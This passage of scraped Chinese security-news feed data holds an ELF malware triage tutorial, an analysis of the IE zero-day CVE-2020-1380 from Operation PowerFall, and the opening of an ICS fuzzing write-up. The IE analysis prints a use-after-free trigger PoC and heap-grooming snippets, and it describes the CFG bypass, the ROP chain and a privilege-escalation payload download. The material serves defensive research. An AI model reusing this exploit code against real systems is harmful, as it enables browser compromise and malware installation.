left;\">解析器是将脚本编译为可执行文件的程序，用解析器编译的ELF文件在二进制文件中包含一个已编译的脚本。解析器也可以被视为“脚本混淆器”，因为ELF文件只是“封装”了明文源脚本。</p><p style=\"text-align: left;\">让我们回顾一下两个常用的解析器：</p><p style=\"text-align: left;\">Pyinstaller：编译python。</p><p style=\"text-align: left;\">shc：Shell脚本编译器。</p><p><span style=\"font-size: 20px;\"><strong>Pyinstaller</strong></span></p><p style=\"text-align: left;\">使用Pyinstaller编译的文件将具有pydata节名称，这是脚本的pyc（已编译的python源代码）放在ELF二进制文件中的位置。检测Pynistaller二进制文件的另一种方法是通过字符串。解析器具有唯一的字符串，例如“检测到错误的启动Python VM”，看看这个<a href=\"https://github.com/intezer/ELF-Malware-Analysis-101/blob/master/Part-2-Initial-Analysis/YARA/interpretes.yar\" target=\"_self\">YARA规则</a>。</p><p style=\"text-align: left;\"><a href=\"https://analyze.intezer.com/files/06ad6831768fb9d04b5cbecce9753bab3be487992936eb82a00d8f77fb4b11bf?utm_source=Blog&utm_medium=elf-malware-analysis-101-initial-analysis\" target=\"_self\">代码重用</a>对于检测Pyinstaller编译文件也很有帮助：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239934131265.png\" title=\"1598192541116525.png\" alt=\"20.png\"/></p><p style=\"text-align: left;\">我们可以使用pyinstxtractor从ELF二进制文件中提取python脚本。请遵循<a href=\"https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries\" target=\"_self\">本指南</a>，了解如何将其应用于ELF文件。请注意，你用于运行pyinstxtractor的python版本应与你正在分析的二进制文件中使用的版本相同。如果不匹配，pyinstxtractor将发出警告。</p><p style=\"text-align: left;\">让我们尝试一下（在<a href=\"https://github.com/intezer/ELF-Malware-Analysis-101/raw/master/Part-2-Initial-Analysis/Article-samples/test_pyinstaller\" target=\"_self\">此处</a>下载编译文件格式）：</p><p style=\"text-align: left;\">首先，让我们编译一个Pyinstaller文件：</p><p style=\"text-align: left;\">1.在VM上安装Python和Pyinstaller：</p><pre class=\"brush:html;toolbar:false\">sudo&#160;apt&#160;update\n&#160;sudo&#160;apt&#160;install&#160;-y&#160;python3\n&#160;sudo&#160;apt&#160;install&#160;-y&#160;python3-pip\n&#160;sudo&#160;pip3&#160;install&#160;pyinstaller</pre><p style=\"text-align: left;\">2.使用test_pyinstaller.py创建一个简单的python脚本代码：</p><p style=\"text-align: left;\">nano test_pyinstaller.py将以下脚本复制到test_pyinstaller.py：</p><pre class=\"brush:html;toolbar:false\">for&#160;i&#160;in&#160;range(1,6):\n&#160;print(f”this&#160;is&#160;output&#160;#{i}”)</pre><p style=\"text-align: left;\">最后保存（ctrl + x）。</p><p style=\"text-align: left;\">3.使用Pyinstaller编译文件：</p><p style=\"text-align: left;\">Pyinstaller：onefile test_pyinstaller.pyPyinstaller在源文件夹中创建了2个目录：dist和build。编译后的文件位于/ dist目录中。你可以运行该文件，还可以检查pydata节及其字符串。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239934140835.png\" title=\"1598192584126231.png\" alt=\"21.png\"/></p><p style=\"text-align: left;\">从已编译的二进制文件中提取python脚本：</p><p style=\"text-align: left;\">1.下载pyinextractor和uncompyle6：</p><pre class=\"brush:html;toolbar:false\">sudo&#160;apt&#160;install&#160;-y&#160;git\n&#160;\ngit&#160;clone\n&#160;\nsudo&#160;pip3&#160;install&#160;uncompyle6</pre><p style=\"text-align: left;\">2.使用objcopy转储pydata节，本节包含pyc（Python字节码）。让我们在一个干净的目录中工作。</p><pre class=\"brush:html;toolbar:false\">mkdir&#160;training-pyinstaller\n&#160;cd&#160;training-pyinstaller\n&#160;objcopy&#160;–dump-section&#160;pydata=pydata.dump&#160;../dist/test_pyinstaller</pre><p style=\"text-align: left;\">3.在pydata转储上运行pyinstxtractor：</p><p style=\"text-align: left;\">python3 ../pyinstxtractor/pyinstxtractor.py pydata.dump你应该收到以下输出：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239935230091.png\" title=\"1598192610100669.png\" alt=\"22.png\"/></p><p style=\"text-align: left;\">pyinstxtractor创建了一个名为pydata.dump_extracted的目录。请注意，该工具会建议可能的入口点（在我们的示例中，我们知道它的test_pyinstaller.pyc）。</p><p style=\"text-align: left;\">使用uncompyle6反编译相关的pyc文件。 uncompyle6是一个Python反编译器，可将Python字节码转换为等效的Python源代码：</p><pre class=\"brush:html;toolbar:false\">cd&#160;pydata.dump_extracted\nuncompyle6&#160;test_pyinstaller.pyc</pre><p style=\"text-align: left;\">现在，我们已经成功提取了Python代码：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239936115229.png\" title=\"1598192620420257.png\" alt=\"23.png\"/></p><p><span style=\"font-size: 20px;\"><strong>shc</strong></span></p><p style=\"text-align: left;\">shc是一个shell脚本编译器，使用shc编译的文件具有特定的字符串。你可以使用YARA签名与代码重用一起检测它们。 UnSHc工具可用于从使用较早的shc版本编译的文件中提取已编译的bash脚本（当前尚不存在从该工具的更高版本中提取脚本的公共解决方案）。</p><p style=\"text-align: left;\">当文件具有以下内容时，我们怀疑该文件是解析器：</p><p style=\"text-align: left;\">1.解析器代码重用；</p><p style=\"text-align: left;\">2.高熵（在某些情况下）；</p><p style=\"text-align: left;\">3.解析器签名，例如唯一的字符串和节名称；</p><p style=\"text-align: left;\">下一步要做的就是：</p><p style=\"text-align: left;\">1.如果有脚本提取解决方案，我们将在二进制文件上运行它。</p><p style=\"text-align: left;\">2.如果没有可用的脚本提取解决方案，我们将继续进行动态分析。</p><p><span style=\"font-size: 20px;\"><strong>ELFparser工具</strong></span></p><p style=\"text-align: left;\">Elfparser是一个开源项目，不过过去几年尚未更新。话虽如此，当你要搜索文件功能的可疑对象和指示符时，此工具可用于初步分析。除了将ELF文件解析到与初始分析相关的各种表之外，该工具还包含基于文件的静态工件的嵌入式签名，这些签名被转换为“功能”。然后将这些功能转换为最终分数。分数越高，文件越可疑。对该分数应稍加怀疑，因为该指标容易出现误报，而且可信文件也可能会高度可疑。</p><p style=\"text-align: left;\">目前这些样本已经上传到了ELFparser工具：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239936389667.png\" title=\"1598192631269802.png\" alt=\"24.png\"/></p><p style=\"text-align: left;\">它将系统和popen函数映射到它们的相关类别，并识别嵌入的IP地址。</p><p><span style=\"font-size: 20px;\"><strong>真实的ELF恶意软件样本分析</strong></span></p><p style=\"text-align: left;\">我们将分析一个真实的ELF恶意软件样本，并将为你提供3个其他样本，以便你可以自己进行初始ELF分析。你可以在<a href=\"https://github.com/intezer/ELF-Malware-Analysis-101/tree/master/Part-2-Initial-Analysis/Real-life-examples/Exercise\" target=\"_self\">此处</a>找到练习样本。</p><p style=\"text-align: left;\">让我们下载此示例，然后使用ELFparser打开它，以便我们可以获取文件的初始概述。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239936548484.png\" title=\"1598192642195067.png\" alt=\"25.png\"/></p><p style=\"text-align: left;\">Elfparser将该文件识别为UPX压缩文件，让我们使用upx -d解压缩文件。</p><p style=\"text-align: left;\">现在我们已经解压缩了文件，让我们在ELFparser中再次打开它。你可以看到该文件具有符号，并且ELFparser收集了一些功能：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239937101217.png\" title=\"1598192652102826.png\" alt=\"26.png\"/></p><p style=\"text-align: left;\">该文件可能会生成HTTP请求作为其功能的一部分，User-Agent和Host标头是变量（基于％s）。</p><p style=\"text-align: left;\">让我们在文件上运行strings命令，该文件包含大量类似于用户代理的字符串。我们可以假设它们可能与ELFparser标识的HTTP请求有关，并且二进制文件正在使用不同的用户代理，以避免被尝试联系的主机阻止。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239937570782.png\" title=\"1598192662202729.png\" alt=\"27.png\"/></p><p style=\"text-align: left;\">此时，我们可能怀疑我们没有处理受信任的文件，并且它也可能与某些DDoS恶意软件有关，但是在得出结论之前，我们应该首先收集更多信息。</p><p style=\"text-align: left;\">让我们看一下文件的符号，因为它包含许多符号，所以分别使用readelf和grep每种符号类型。</p><pre class=\"brush:html;toolbar:false\">readelf&#160;-s&#160;training-sample&#160;|&#160;grep&#160;FUNC</pre><p style=\"text-align: left;\">该文件包含一些异常和可疑的函数名称：</p><pre class=\"brush:html;toolbar:false\">FindRandIP，tcpFl00d，udpfl00d</pre><p style=\"text-align: left;\">我们几乎可以断定该文件是恶意软件，让我们在Google上快速搜索这些函数，以便我们对文件进行分类。根据Mirai和Gafgyt分析的搜索结果。现在很明显，该文件是僵尸网络，是Mirai的变体。</p><p><span style=\"font-size: 20px;\"><strong>Golang文件</strong></span></p><p style=\"text-align: left;\">我们看到一种新趋势，我们看到恶意软件是用Golang写的。Kaiji, NOTROBIN, Kinsing就是一些例子。不过，Golang文件与经典的ELF文件具有不同的结构。</p><p><span style=\"font-size: 20px;\"><strong>总结</strong></span></p><p style=\"text-align: left;\">我们回顾了最初的ELF分析，重点是静态分析。而且还详细介绍了与初始分析相关的不同工件和组件，并了解了它们如何帮助我们立即收集有关文件的分析。我们还说明了可以使用哪些工具来收集这些分析。</p><p style=\"text-align: left;\">初步分析是在处理文件时应采取的第一步，但这并不总是足以确定文件的结论并确定威胁是否为恶意文件。在初始分析阶段，文件可能会被封装，删除或提供的信息不足以进行评估。</p>","descriptionType":"text/html","publishedDate":"Fri, 04 Sep 2020 01:49:15 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239922418869.jpeg","linkMd5":"8d0ba5a94eb804af394fd80b5861516c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn56@2020_1/2020/09/05/07-31-08-978_4f042b346849e277.webp","destWidth":1024,"destHeight":475,"sourceBytes":188340,"destBytes":204136,"author":"xiaohui","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239922418869.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn56@2020_1/2020/09/05/07-31-08-978_4f042b346849e277.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239923982091.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn48@2020_6/2020/09/05/07-31-24-321_0713295e4aaa1108.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239924825697.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn64@2020_3/2020/09/05/07-31-22-026_130e7b429bc08710.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239925586990.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn52@2020_4/2020/09/05/07-31-20-941_72d7327ff0c95d9f.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239927551825.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn88@2020_5/2020/09/05/07-31-25-730_c269d88ea3b59563.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239928104790.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn29@2020_6/2020/09/05/07-31-18-075_210953d8551ed3e1.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239929829443.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn16@2020_3/2020/09/05/07-31-21-015_d181fff29cc0135f.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239929567599.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn7@2020_1/2020/09/05/07-31-21-480_53f11e311364750d.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239930154928.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn32@2020_4/2020/09/05/07-31-24-080_42700e88d1926b4c.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239930167819.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn68@2020_4/2020/09/05/07-31-22-911_605ad1048d0dc9b8.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239931187738.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn7@2020_6/2020/09/05/07-31-26-949_cc130111ed1f1ada.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239934131265.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn22@2020_5/2020/09/05/07-31-27-945_1d0e7c9ddd75fda6.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239934140835.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn59@2020_1/2020/09/05/07-31-21-593_6a08821105ede966.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239935230091.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn50@2020_1/2020/09/05/07-31-19-897_376a7ebc152c1393.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239936115229.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn43@2020_4/2020/09/05/07-31-28-045_d0ee8abe5b489586.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239936389667.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn16@2020_2/2020/09/05/07-31-23-029_751b4fee7fe0347e.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239936548484.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn38@2020_3/2020/09/05/07-31-19-545_2539032e6ed1693d.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239937101217.png":null,"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239937570782.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn17@2020_5/2020/09/05/07-31-29-141_7f61f92629e891b9.webp"},"publishedOrCreatedDate":1599291056255},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"Operation PowerFall攻击活动中的IE和Windows 0day漏洞","link":"https://www.4hou.com/posts/DPVn","description":"<p>研究人员在Operation PowerFall攻击活动中发现了一个0 day漏洞——CVE-2020-1380。该漏洞是一个JS中的UAF漏洞，补丁已于2020年8月11日发布。</p><p><a></a><span style=\"font-size: 20px;\"><strong>IE 11远程代码执行漏洞利用</strong></span></p><p>最近发现的在野IE 0 day漏洞利用主要是依赖JavaScript 引擎jscript.dll中CVE-2020-0674、CVE-2019-1429、CVE-2019-0676和 CVE-2018-8653等漏洞。而CVE-2020-1380是jscript9.dll中的漏洞，从IE 9开始默认使用。</p><p>CVE-2020-1380是JIT 优化引发的UAF漏洞，是由于即时编译代码中缺乏必要的检查导致的。触发该漏洞的PoC代码如下：</p><pre class=\"brush:html;toolbar:false;\">function&#160;func(O,&#160;A,&#160;F,&#160;O2)&#160;{arguments.push&#160;=&#160;Array.prototype.push;O&#160;=&#160;1;arguments.length&#160;=&#160;0;arguments.push(O2);if&#160;(F&#160;==&#160;1)&#160;{O&#160;=&#160;2;}//&#160;execute&#160;abp.valueOf()&#160;and&#160;write&#160;by&#160;dangling&#160;pointerA[5]&nbsp;=&#160;O;};//&#160;prepare&#160;objectsvar&#160;an&#160;=&#160;new&#160;ArrayBuffer(0x8c);var&#160;fa&#160;=&#160;new&#160;Float32Array(an);//&#160;compile&#160;funcfunc(1,&#160;fa,&#160;1,&#160;{});for&#160;(var&#160;i&#160;=&#160;0;&#160;i&#160;&#60;&#160;0x10000;&#160;i++)&#160;{func(1,&#160;fa,&#160;1,&#160;1);}var&#160;abp&#160;=&#160;{};abp.valueOf&#160;=&#160;function()&#160;{//&#160;freeworker&#160;=&#160;new&#160;Worker(&#39;worker.js&#39;);worker.postMessage(an,&#160;[an]);worker.terminate();worker&#160;=&#160;null;//&#160;sleepvar&#160;start&#160;=&#160;Date.now();while&#160;(Date.now()&#160;-&#160;start&#160;&#60;&#160;200)&#160;{}//&#160;TODO:&#160;reclaim&#160;freed&#160;memoryreturn&#160;0};try&#160;{func(1,&#160;fa,&#160;0,&#160;abp);}&#160;catch&#160;(e)&#160;{reload()}</pre><p>为更好地理解该漏洞，首先要了解func()的执行原理。其中最重要的是理解A[5]的设定值。从代码来看，应该是O参数。函数启动后，O&#160;参数会被重新分配为1，然后函数参数长度会被设置为0。该操作并不会清除函数参数，但允许使用Array.prototype.push将参数O2放置到index 0的参数列表中，也就是说O = O2。此外，如果参数F等于1，参数O就会被重新分配为2。也就是说，根据参数F的值，参数O等于O2或2。参数A&#160;是32位浮点数数组，在分配给index 5值之前，该值会转化为浮点数。</p><p>漏洞利用使用对象abp和valueOf()方法。该方法在对象转化为浮点数时执行，但是该方法中有释放ArrayBuffer的代码。为了防止值保持在释放的对象的内存中，JS引擎在保持该值之前需要检查对象的状态。为了安全地转化和保持浮点值，JScript9.dll会使用函数Js::TypedArray</p><pre class=\"brush:html;toolbar:false;\">int&#160;Js::TypedArray::BaseTypedDirectSetItem(Js::TypedArray&#160;*this,&#160;unsigned&#160;int&#160;index,&#160;void&#160;*object,&#160;int&#160;reserved){Js::JavascriptConversion::ToNumber(object,&#160;this-&#62;type-&#62;library-&#62;context);if&#160;(&#160;LOBYTE(this-&#62;view[0]-&#62;unusable)&#160;)Js::JavascriptError::ThrowTypeError(this-&#62;type-&#62;library-&#62;context,&#160;0x800A15E4,&#160;0);if&#160;(&#160;index&#160;&#60;&#160;this-&#62;count&#160;){*(float&#160;*)&#38;this-&#62;buffer[4&#160;*&#160;index]&nbsp;=&#160;Js::JavascriptConversion::ToNumber(object,this-&#62;type-&#62;library-&#62;context);}return&#160;1;}double&#160;Js::JavascriptConversion::ToNumber(void&#160;*object,&#160;struct&#160;Js::ScriptContext&#160;*context){if&#160;(&#160;(unsigned&#160;char)object&#160;&#38;&#160;1&#160;)return&#160;(double)((int)object&#160;&#62;&#62;&#160;1);if&#160;(&#160;*(void&#160;**)object&#160;==&#160;VirtualTableInfo::Address[0]&nbsp;)return&#160;*((double&#160;*)object&#160;+&#160;1);return&#160;Js::JavascriptConversion::ToNumber_Full(object,&#160;context);</pre><p>函数会检查数组的view[0]-&#62;unusable和count域，ArrayBuffer在valueOf()&#160;方法执行时会被释放，因为首次调用Js::JavascriptConversion::ToNumber()时，view[0]-&#62;unusable被设置为1，count被设置为0，因此这两个域的检查都会失败。因为函数Js::TypedArray</p><p>当函数func()编译时，JS 引擎会使用有漏洞的代码，如下所示：</p><pre class=\"brush:html;toolbar:false;\">if&#160;(&#160;!((unsigned&#160;char)floatArray&#160;&#38;&#160;1)&#160;&#38;&#38;&#160;*(void&#160;*)floatArray&#160;==&#160;&#38;Js::TypedArray::vftable&#160;){if&#160;(&#160;floatArray-&#62;count&#160;&#62;&#160;index&#160;){buffer&#160;=&#160;floatArray-&#62;buffer&#160;+&#160;4*index;if&#160;(&#160;object&#160;&#38;&#160;1&#160;){*(float&#160;*)buffer&#160;=&#160;(double)(object&#160;&#62;&#62;&#160;1);}else{if&#160;(&#160;*(void&#160;*)object&#160;!=&#160;&#38;Js::JavascriptNumber::vftable&#160;){Js::JavascriptConversion::ToFloat_Helper(object,&#160;(float&#160;*)buffer,&#160;context);}else{*(float&#160;*)buffer&#160;=&#160;*(double&#160;*)(object-&#62;value);}}}}</pre><p>以下是Js::JavascriptConversion::ToFloat_Helper()&#160;函数的代码：</p><pre class=\"brush:html;toolbar:false;\">void&#160;Js::JavascriptConversion::ToFloat_Helper(void&#160;*object,&#160;float&#160;*buffer,&#160;struct&#160;Js::ScriptContext&#160;*context){*buffer&#160;=&#160;Js::JavascriptConversion::ToNumber_Full(object,&#160;context);}</pre><p>与翻译模式不同的是，在实时编译的代码中，并不会检查ArrayBuffer，其内存会被释放然后在valueOf()函数被调用时重新声明。此外，攻击者可以控制返回值要写入的index。当PoC 中的arguments.length = 0;和arguments.push(O2);&#160;被替换为arguments[0] = O2;时，Js::JavascriptConversion::ToFloat_Helper()并不会触发漏洞，因为调用会被禁用，也不会执行到valueOf()的调用。</p><p>为了确保函数func()即时编译，漏洞利用执行了该函数0x10000次，只有在func()函数多执行一次后才会触发漏洞。为了释放ArrayBuffer，漏洞利用会滥用Web Workers API。函数postMessage()&#160;会用来序列号对象并发送。转化的对象被释放后，在当前脚本环境中会无法使用。当ArrayBuffer被释放时，漏洞利用会通过模拟Sleep()函数的使用来触发垃圾回收：检查Date.now()和之前保存的值之间的时间间隔。之后，漏洞利用会声明含有整数数组的内存。</p><pre class=\"brush:html;toolbar:false;\">for&#160;(var&#160;i&#160;=&#160;0;&#160;i&#160;&#60;&#160;T.length;&#160;i&#160;+=&#160;1)&#160;{T[i]&nbsp;=&#160;new&#160;Array((0x1000&#160;-&#160;0x20)&#160;/&#160;4);T[i][0]&nbsp;=&#160;0x666;&#160;//&#160;item&#160;needs&#160;to&#160;be&#160;set&#160;to&#160;allocate&#160;LargeHeapBucket}</pre><p>在创建了大量的数组后，IE就会分配IE定制堆首先使用的新的LargeHeapBlock&#160;对象。LargeHeapBlock对象会保存为数组分配的缓存地址。如果成功获得期望的内存布局，漏洞就会用0覆写LargeHeapBlock的偏移量0x14，即分配的区块数。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598324142152039.png\"/></p><p style=\"text-align: center;\">jscript9.dll x86的LargeHeapBlock结构</p><p>之后，漏洞利用会分配大量的数组，并设置为漏洞利用初始阶段准备的另一个数组。然后该数组会设置为null，漏洞利用会调用CollectGarbage()函数。导致堆的碎片重新整理，修改后的LargeHeapBlock和相关的数组缓存都会释放。此时，漏洞利用会创建大量的整数数组来重新声明之前释放的数组缓存。新创建的数组在index 0处有一个值，并通过到之前释放的数组的指针来检查漏洞利用是否成功。</p><pre class=\"brush:html;toolbar:false;\">for&#160;(var&#160;i&#160;=&#160;0;&#160;i&#160;&#60;&#160;K.length;&#160;i&#160;+=&#160;1)&#160;{K[i]&nbsp;=&#160;new&#160;Array((0x1000&#160;-&#160;0x20)&#160;/&#160;4);K[i][0]&nbsp;=&#160;0x888;&#160;//&#160;store&#160;magic}for&#160;(var&#160;i&#160;=&#160;0;&#160;i&#160;&#60;&#160;T.length;&#160;i&#160;+=&#160;1)&#160;{if&#160;(T[i][0]&nbsp;==&#160;0x888)&#160;{&#160;//&#160;find&#160;array&#160;accessible&#160;through&#160;dangling&#160;pointerR&#160;=&#160;T[i];break;}}</pre><p>因此，漏洞利用会创建两个指向相同位置的缓存的JavascriptNativeIntArray对象。因此可以提取对象的地址，甚至创建新构造的对象。漏洞利用使用了这些原语来创建了一个构造的DataView&#160;对象，并获取了进程整个地址空间的读写权限。</p><p>利用任意读写原语的构造可以绕过Control Flow Guard (CFG)和实现代码执行。漏洞利用使用Array的vftable指针来获得jscript9.dll的模块基地址。然后分析jscript9.dll的PE header来获取Import Directory Table的地址，并解析其他模块的基地址。目标是找到函数VirtualProtect()的地址，这会将shellcode变得可以执行。之后，漏洞利用会在jscript9.dll中搜索2个签名。这些签名对应Unicode字符串split的地址和函数JsUtil::DoublyLinkedListElement</p><p>之后进入下一个阶段。漏洞利用会执行split()方法，并提供一个含有覆写的valueOf()方法的对象作为限制参数。函数Js::JavascriptString::EntrySplit()在执行过程中valueOf()方法也会执行，漏洞利用会搜索线程的栈来找到返回的地址，并shellcode放置在之前的缓存中，获取其地址，并通过覆写函数的返回地址来构造一个return-oriented programming (ROP)链来执行shellcode。</p><p><a></a><span style=\"font-size: 20px;\"><strong>下一个阶段</strong></span></p><p>Shellcode是加到shellcode的PE模块的反射型DLL加载器。该模块非常小，整个功能位于单独的函数中。并在临时文件夹中创建一个名为ok.exe的文件，并将远程代码执行漏洞利用中的另一个可执行文件的内容写入。之后，执行ok.exe。</p><p>ok.exe可执行文件中含有GDI Print / Print Spooler API中任意指针简接引用漏洞CVE-2020-0986的权限提升漏洞利用。该漏洞利用可以使用进程间通信来实现splwow64.exe进程的任意内存读写，并用它来实现splwow64.exe进程的代码执行，绕过CFG 和EncodePointer保护。漏洞利用以及两个可仔细文件都会嵌入到其资源中。第一个可执行文件会写入磁盘中（CreateDC.exe），然后用来创建漏洞利用所需的设备环境（device context）。第二个可执行文件名为PoPc.dll，如果漏洞利用成功，splwow64.exe就会执行。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598324147187300.png\"/></p><p style=\"text-align: center;\">来自splwow64.exe的恶意PowerShell 命令执行</p><p>PoPc.dll的主要功能位于单个函数中，执行一个编码的PowerShell命令来从www[.]static-cdn1[.]com/update.zip下载文件，并以upgrader.exe保存到临时文件中并执行。</p>","descriptionType":"text/html","publishedDate":"Wed, 02 Sep 2020 03:20:00 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598324142152039.png","linkMd5":"e2801c0105fa9272b5c2785b034eaec8","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx/cdn80@2020_4/2020/09/05/07-31-00-307_ee37d5eed488b9e0.webp","destWidth":226,"destHeight":324,"sourceBytes":4829,"destBytes":14148,"author":"ang010ela","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598324142152039.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn80@2020_4/2020/09/05/07-31-00-307_ee37d5eed488b9e0.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598324147187300.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn100@2020_2/2020/09/05/07-31-25-098_3089f086b603c3ca.webp"},"publishedOrCreatedDate":1599291056256},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"对ICS和SCADA工控设备的漏洞挖掘和分析研究","link":"https://www.4hou.com/posts/N5lD","description":"<p><span style=\"font-size: 20px;\"><strong>0x01 &#160;前言</strong></span></p><p>不管挖掘的目标产品是什么，我的方法始终遵循相同的结构，我将生成一些畸形数据，例如基于文件的输入等，进行变异并将其馈送到带有调试器的应用程序中，在预定的时间后，我将终止目标过程并记录结果，crash将被记录些来，然后分析这些crash。</p><p>通用漏洞挖掘流程：</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579190851916-0NGWMH6LPLVZYHPAAV50/ke17ZwdGBToddI8pDm48kGquRXuSNM8VNiRz-JE3cjFZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIiuQFkNGSHnwfzV1gwJ8nndsfNWuEXxXBQeWWtn1_abk/Fig1.png?format=1000w\"/></p><p style=\"text-align: center;\">图1：模糊测试</p><p><span style=\"font-size: 20px;\"><strong>0x02 &#160;漏洞挖掘</strong></span></p><p>一旦应用程序crash，我会用windbg 使用<a href=\"https://archive.codeplex.com/?p=msecdbg\">！exploitable</a>添加扩展名，来删除重复数据，设置crash优先级，对于不熟悉此扩展程序的用户，一旦应用程序crash，将调用！exploitable，并尝试根据其执行的分析对crash进行分类。它为每个crash分配可利用性类别（即，可利用，可能利用，不可利用等）以及与该crash相关的哈希。</p><p>我使用此信息根据类别对crash进行存储，然后再次使用主要和次要哈希值进行存储。</p><p>最终会看起来像这样：</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191013284-XF6EEC322W9E5TPUGS6E/ke17ZwdGBToddI8pDm48kOuKQhATqZFNN3vX4_aPbztZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI1S574DVO7IFsPUeqc-YKuBpb1LF01TSQHKWZqGa7C-8/Picture2.png?format=1000w\"/></p><p style=\"text-align: center;\">图2：crash结果</p><p>从这里我可以开始打开调试日志，并更好地了解导致应用程序crash的原因。例如，如果我查看bwmail.exe的日志文件，我可以看到它由于基于堆栈的缓冲区溢出而最终crash了。</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191075147-WYIB5NUVO6YHAOW6YA86/ke17ZwdGBToddI8pDm48kBZ7TSA-OIHIMgNUW3PhN0UUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKc__cYxNkZ9ENOO4OE3kD_Y7ZnqXUYsnMuOC9JBBnWpP9VlWo1ts9fs6mkZXFLIxF6/Picture3.png?format=1000w\"/></p><p style=\"text-align: center;\">图3：基于堆栈的缓冲区溢出</p><p>如果要在IDA中打开bwmail.exe应用程序，我可以发现此漏洞的根本原因是使用了列入不安全函数黑名单的API调用strcpy。如果重新启动应用程序并在该调用上设置一个断点并转储EAX寄存器的内容，则可以看到它包含我的payload。</p><p style=\"text-align: center;\"><img src=\"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191576348-7XLM4TIQX5XW2NFS3EBX/ke17ZwdGBToddI8pDm48kBchc7xnrS7Gdo12TWJ-8n5Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIW2WQp2P3Lck4hhr40BERrd2UNrVWY2NhjRIcV6fFPyk/Picture4.png?format=1000w\"/></p><p style=\"text-align: 